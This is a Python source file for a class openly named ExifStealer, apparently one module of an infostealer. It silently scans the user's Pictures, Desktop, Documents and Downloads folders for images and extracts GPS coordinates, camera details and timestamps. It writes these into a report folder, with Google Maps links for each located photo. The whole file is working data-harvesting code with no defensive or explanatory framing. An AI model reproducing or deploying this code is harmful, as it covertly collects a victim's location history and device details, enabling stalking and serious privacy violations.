import os
import logging

from PIL import Image
from PIL.ExifTags import TAGS, GPSTAGS


class ExifStealer:
    IMAGE_EXTENSIONS = ('.jpg', '.jpeg', '.png', '.tiff', '.heic')
    SEARCH_DIRS = [
        os.path.join(os.path.expanduser('~'), 'Pictures'),
        os.path.join(os.path.expanduser('~'), 'Desktop'),
        os.path.join(os.path.expanduser('~'), 'Documents'),
        os.path.join(os.path.expanduser('~'), 'Downloads'),
    ]
    MAX_IMAGES = 100

    _log = logging.getLogger('ExifStealer')

    @staticmethod
    def get_decimal_from_dms(dms, ref: str) -> float:
        """Convert GPS DMS to decimal degrees.
        Handles both old-style tuples ((num, den), ...) and newer IFDRational objects."""
        try:
            parts: list[float] = []
            for component in dms:
                if hasattr(component, 'numerator') and hasattr(component, 'denominator'):
                    # IFDRational object
                    if component.denominator == 0:
                        parts.append(0.0)
                    else:
                        parts.append(float(component.numerator) / float(component.denominator))
                elif isinstance(component, tuple) and len(component) == 2:
                    # Old style (numerator, denominator)
                    num, den = component
                    if den == 0:
                        parts.append(0.0)
                    else:
                        parts.append(float(num) / float(den))
                else:
                    parts.append(float(component))

            if len(parts) < 3:
                return 0.0

            degrees = parts[0]
            minutes = parts[1]
            seconds = parts[2]
            decimal = degrees + (minutes / 60.0) + (seconds / 3600.0)

            if ref in ('S', 'W'):
                decimal = -decimal

            return decimal
        except Exception:
            return 0.0

    @classmethod
    def extract_exif(cls, filepath: str) -> dict | None:
        try:
            img = Image.open(filepath)
        except Exception:
            return None

        try:
            exif_data = img._getexif()
        except Exception:
            return None

        if not exif_data:
            return None

        result: dict = {
            'filepath': filepath,
            'filename': os.path.basename(filepath),
            'dimensions': f'{img.width}x{img.height}',
        }

        # Parse named tags
        tag_data: dict = {}
        for tag_id, value in exif_data.items():
            tag_name = TAGS.get(tag_id, str(tag_id))
            tag_data[tag_name] = value

        # Camera info
        result['make'] = str(tag_data.get('Make', '')).strip()
        result['model'] = str(tag_data.get('Model', '')).strip()
        result['datetime'] = str(tag_data.get('DateTime', '')).strip()
        result['software'] = str(tag_data.get('Software', '')).strip()

        # GPS data
        gps_info = tag_data.get('GPSInfo')
        if gps_info and isinstance(gps_info, dict):
            gps_data: dict = {}
            for gps_tag_id, gps_value in gps_info.items():
                gps_tag_name = GPSTAGS.get(gps_tag_id, str(gps_tag_id))
                gps_data[gps_tag_name] = gps_value

            lat = gps_data.get('GPSLatitude')
            lat_ref = gps_data.get('GPSLatitudeRef', 'N')
            lon = gps_data.get('GPSLongitude')
            lon_ref = gps_data.get('GPSLongitudeRef', 'E')

            if lat and lon:
                lat_dec = cls.get_decimal_from_dms(lat, lat_ref)
                lon_dec = cls.get_decimal_from_dms(lon, lon_ref)
                if lat_dec != 0.0 or lon_dec != 0.0:
                    result['gps_lat'] = lat_dec
                    result['gps_lon'] = lon_dec

        # Only return if there's something useful
        has_gps = 'gps_lat' in result
        has_camera = bool(result.get('make') or result.get('model'))
        has_datetime = bool(result.get('datetime'))

        if has_gps or has_camera or has_datetime:
            return result
        return None

    @classmethod
    def run(cls, output_dir: str) -> None:
        out = os.path.join(output_dir, 'EXIF')
        os.makedirs(out, exist_ok=True)

        results: list[dict] = []
        scanned = 0

        for search_dir in cls.SEARCH_DIRS:
            if not os.path.isdir(search_dir):
                continue

            for root, dirs, files in os.walk(search_dir):
                dirs[:] = [d for d in dirs if not d.startswith('.')]

                if scanned >= cls.MAX_IMAGES:
                    break

                for fname in files:
                    if scanned >= cls.MAX_IMAGES:
                        break

                    _, ext = os.path.splitext(fname)
                    if ext.lower() not in cls.IMAGE_EXTENSIONS:
                        continue

                    fpath = os.path.join(root, fname)
                    scanned += 1

                    exif = cls.extract_exif(fpath)
                    if exif:
                        results.append(exif)

        if not results:
            cls._log.info('No EXIF data found')
            return

        # Write full EXIF report
        exif_lines: list[str] = []
        gps_lines: list[str] = []

        for entry in results:
            exif_lines.append(f'=== {entry["filename"]} ===')
            exif_lines.append(f'Path: {entry["filepath"]}')
            exif_lines.append(f'Dimensions: {entry["dimensions"]}')

            if 'gps_lat' in entry:
                lat = entry['gps_lat']
                lon = entry['gps_lon']
                exif_lines.append(f'GPS: {lat:.6f}, {lon:.6f}')
                exif_lines.append(f'Google Maps: https://maps.google.com/?q={lat:.6f},{lon:.6f}')
                gps_lines.append(f'{entry["filename"]} | {lat:.6f}, {lon:.6f} | '
                                 f'https://maps.google.com/?q={lat:.6f},{lon:.6f}')

            if entry.get('make') or entry.get('model'):
                camera = f'{entry.get("make", "")} {entry.get("model", "")}'.strip()
                exif_lines.append(f'Camera: {camera}')

            if entry.get('datetime'):
                exif_lines.append(f'Date: {entry["datetime"]}')

            if entry.get('software'):
                exif_lines.append(f'Software: {entry["software"]}')

            exif_lines.append('---')

        with open(os.path.join(out, 'exif_data.txt'), 'w', encoding='utf-8') as f:
            f.write('\n'.join(exif_lines))

        if gps_lines:
            with open(os.path.join(out, 'gps_locations.txt'), 'w', encoding='utf-8') as f:
                f.write('\n'.join(gps_lines))

        cls._log.info(f'EXIF data extracted from {len(results)} image(s), '
                       f'{len(gps_lines)} with GPS -> {out}')
